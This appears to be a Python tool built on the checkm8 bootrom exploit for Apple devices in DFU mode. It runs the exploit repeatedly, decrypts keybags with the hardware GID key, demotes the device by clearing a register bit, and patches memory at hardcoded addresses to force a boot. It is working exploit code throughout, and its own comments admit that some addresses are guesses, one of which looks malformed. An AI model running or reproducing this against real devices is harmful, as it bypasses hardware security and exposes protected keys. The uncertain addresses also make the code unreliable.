import checkm8.usbexec as usbexec
from checkm8.checkm8 import exploit
from checkm8.device import DFUDevice
import struct

class Device:
    def __init__(self):
        self.serial = None
        self.pwned = False
        self.update_serial()

    def update_serial(self):
        dfu_device = DFUDevice()
        self.serial = dfu_device.device.serial_number
        self.pwned = 'PWND:[checkm8]' in self.serial
        dfu_device.release()

    def decrypt_gid(self, keybag):
        self.do_exploit_if_needed()
        pwned = usbexec.PwnedUSBDevice()
        return pwned.aes(bytes.fromhex(keybag), usbexec.AES_DECRYPT, usbexec.AES_GID_KEY).hex()

    def boot(self):
        self.do_exploit_if_needed()

        pwned = usbexec.PwnedUSBDevice()

        # Repair heap
        HEAP_BASE = 0x1801B4000
        HEAP_WRITE_OFFSET = 0x5000
        HEAP_WRITE_HASH = 0x10000F364
        HEAP_VERIFY = 0x10000F8B4

        # unsure about this one, my db for t8010 sucks ass
        HEAP_STATE = 0x180088BA0

        block1 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2, 132, 128, 0)
        block2 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2, 8, 128, 0)

        pwned.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET, block1)
        pwned.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x80, block2)
        pwned.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x100, block2)
        pwned.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x180, block2)
        pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET)
        pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x80)
        pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100)
        pwned.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180)
        pwned.execute(0, HEAP_VERIFY)
        print('Attempted to repair heap')

        BOOT_TRAMPOLINE = 0x1800AC000
        BOOTSTRAP_TASK_LR = 0x1800a9f68

        # no idea, shitty db
        NAND_BOOT_JUMP = 0x100000700

        DFU_BOOL = 0x180088AC0
        DFU_STATE = 0x1800888AF0
        DFU_NOTIFY = 0x10000AEE8

        pwned.write_memory_ptr(BOOTSTRAP_TASK_LR, NAND_BOOT_JUMP)
        pwned.write_memory(DFU_BOOL, '\x01')
        print('Attempting Boot')
        pwned.execute(0, DFU_NOTIFY, DFU_STATE)
        print('Go')


    def demote(self):
        self.do_exploit_if_needed()
        pwned = usbexec.PwnedUSBDevice()
        old_value = pwned.read_memory_uint32(pwned.platform.demotion_reg)
        if old_value & 1:
            pwned.write_memory_uint32(pwned.platform.demotion_reg, old_value & 0xFFFFFFFE)
            new_value = pwned.read_memory_uint32(pwned.platform.demotion_reg)
            if old_value != new_value:
                return True
            else:
                return False
        else:
            return True

    def do_exploit_if_needed(self):
        if self.pwned:
            return
        self.attempt_exploit()

    def attempt_exploit(self, attempts=10):
        for attempt in range(0, attempts+1):
            if not self.pwned:
                exploit()
                self.update_serial()
                if self.pwned:
                    break
            if attempt == 10:
                print("Exploit failed after 10 attempts.")
                raise AssertionError("Exploit Failed after 10 attempts")
